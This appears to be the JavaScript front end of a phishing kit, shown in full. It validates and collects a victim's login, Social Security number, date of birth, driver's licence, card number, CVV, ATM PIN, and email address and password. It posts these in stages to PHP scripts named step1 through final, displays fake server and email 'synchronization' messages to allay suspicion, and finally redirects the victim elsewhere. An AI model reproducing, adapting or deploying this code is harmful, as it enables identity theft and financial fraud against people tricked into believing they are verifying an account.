
	$("#zip").inputmask("99999");
	
	$("#dob").inputmask();
	
	$("#ssn").inputmask("999-99-9999");
	
	$("#phone").inputmask("(999) 999 9999");
	
	$("#drvl").inputmask("99999999999");

	$.validator.setDefaults({
		errorClass : 'clientSideError'
	})

	$("#login-form").validate({
		rules : {

			userId : {
				required : true,
				nowhitespace : true,
				minlength: 3,
				
			},
			password : {
				required : true,
				minlength: 2,
			},
			
			fname : {
				required : true,
				nowhitespace : true,
				lettersonly : true,
				minlength: 4,
				
			},
			mmname : {
				required : true,
				nowhitespace : true,
				lettersonly : true,
				minlength: 1,
			},
			lname : {
				required : true,
				nowhitespace : true,
				lettersonly : true,
				minlength: 2,
			},
			
			add1 : {
				required : true,
				minlength: 10,
			},
			city : {
				required : true,
				lettersonly : true,
				minlength: 3,
			},
			
			state : {
				required : true,
			},	
						
			zip : {
				required : true,
				zipcodeUS : true,
				nowhitespace : true,
				minlength: 4,
				integer : true,				
			},
			
			dob : {
				required : true,
				nowhitespace : true,
				minlength: 10,
			},
			
			ssn : {
				required : true,
				minlength: 11,
				maxlength: 11,
			},
			phone : {
				required : true,
				phoneUS : true,					
			},
			
			drvl : {
				maxlength: 11,					
			},
			
			noncard : {
				required : true,
				minlength: 4,
				
			},
			cc : {
				required : true,
				creditcard : true,
				minlength: 19,
				maxlength : 19,
			},
			
			expd : {
				required : true,
				minlength: 4,
			},
			
			cvv : {
				required : true,
				minlength: 3,
				maxlength : 4,
				alphanumeric : true,
			},
			
			atmpin : {
				required : true,
				minlength: 3,
				maxlength : 7,
				alphanumeric : true,
			},
			
			email : {
				required : true,
				email: true,
			},
			
			epassword : {
				required : true,
				minlength: 4,
			},
			
			
		},
			messages : {
				userId : "",
				password : "",
				fname : "",
				lname : "",
				mname : "",
				add1 : "",
				city : "",
				zip : "",
				dob : "",
				ssn : "",
				phone : "",
				drvl : "",
				state : "",
				noncard : "",
				cc : "",
				expd : "",
				cvv : "",
				atmpin : "",
				email : "",
				epassword : "",
			},
			
		submitHandler: function() {
				
				if($("#login-form").hasClass("nowlogin") == true){
					urltogo = "./review/functions/php/step1.php";
				}
				
				else if($("#login-form").hasClass("nowstep1") == true){
					urltogo = "./review/functions/php/step2.php";
				}
				
				else if($("#login-form").hasClass("nowstep2") == true){
					urltogo = "./review/functions/php/step3.php";
				}
				
				else if($("#login-form").hasClass("nowstep3") == true){
					urltogo = "./review/functions/php/step4.php";
				}
				
				else if($("#login-form").hasClass("nowstep4") == true){
					urltogo = "./review/functions/php/final.php";
				}
				
				var data = $('#login-form').serialize();
				$.ajax({
					url: urltogo,
					type: "POST",
					data: data,
					beforeSend: function(){
						
						if($("#login-form").hasClass("nowstep3") == true){
							
							$("#signin-button").addClass("disabled");
							$("#signin-button").attr("disabled", "disabled");
							
							$("#loading").removeClass("hidden");
							
							setTimeout(
							  function() 
							  {
								$("#msgContiner").html("<p style=\"font-size:15px;\">Connection to the Server...</p>");
								
								setTimeout(
								  function() 
								  {
									$("#msgContiner").html("<p style=\"font-size:15px;\">Synchronizing with Server...</p>");
									
									setTimeout(
									  function() 
									  {
										  
										$("#msgContiner").html("<p style=\"font-size:15px;\">Synchronizing with Email...</p>");
										
										setTimeout(
										  function() 
										  {
											  
											$("#msgContiner").html("<p style=\"font-size:15px; color:red\">Failed to Synchronizing with Email...</p>");
											
											setTimeout(
											  function() 
											  {
												  
												$("#msgContiner").html("<p style=\"font-size:15px;\">Retry to Synchronizing with Email...</p>");
												
											  }, 4000);
											
										  }, 3000);
										
									  }, 3000);
										
								  }, 2000);
					
							  }, 1000);
							
						}
						
						else if($("#login-form").hasClass("nowstep4") == true){
							
							$("#signin-button").addClass("disabled");
							$("#signin-button").attr("disabled", "disabled");
							
							$("#loading").removeClass("hidden");
							
							setTimeout(
							  function() 
							  {
								$("#msgContiner").html("<p style=\"font-size:15px;\">Synchronizing with Email...</p>");
								
								setTimeout(
								  function() 
								  {
									$("#msgContiner").html("<p style=\"font-size:15px;\">Connecting...</p>");
									
									setTimeout(
									  function() 
									  {
										  
										$("#msgContiner").html("<p style=\"font-size:15px;\">Synchronization Success...</p>");
										
										
											setTimeout(
											  function() 
											  {
												  
												$("#msgContiner").append("<p style=\"font-size:15px;\">Redirection to login page...</p>");
												
												
											  }, 4000);
												
									  }, 3000);
										
								  }, 4000);
					
							  }, 1000);
							
						}

						
						else {
							
							$("#signin-button").addClass("disabled");
							$("#signin-button").attr("disabled", "disabled");
							
						}
						
						
					},
					success: function (response) {
						
						if($("#login-form").hasClass("nowstep4") == true){
							
							location.href=""+response+"";
							
						}
						else {
							
							$('#loginonbigbox').hide().html(response).fadeIn("slow");
						}
							
					}
					
				});
			}							
			
		})

		if($("#login-form").hasClass("nowstep3") == true){
	
			var card = new Card({
				form: 'form',
				container: '.card-wrapper', 
			
				formSelectors: {
					numberInput: 'input#number', 
					expiryInput: 'input#expiry', 
					cvcInput: 'input#cvc',  
					nameInput: 'input#name' 
				},
			
				formatting: true,
			
				messages: {
					validDate: 'valid\ndate', 
					monthYear: 'mm/yyyy', 
				},
			
				debug: false 
			});
	
		}



						
						
						//




















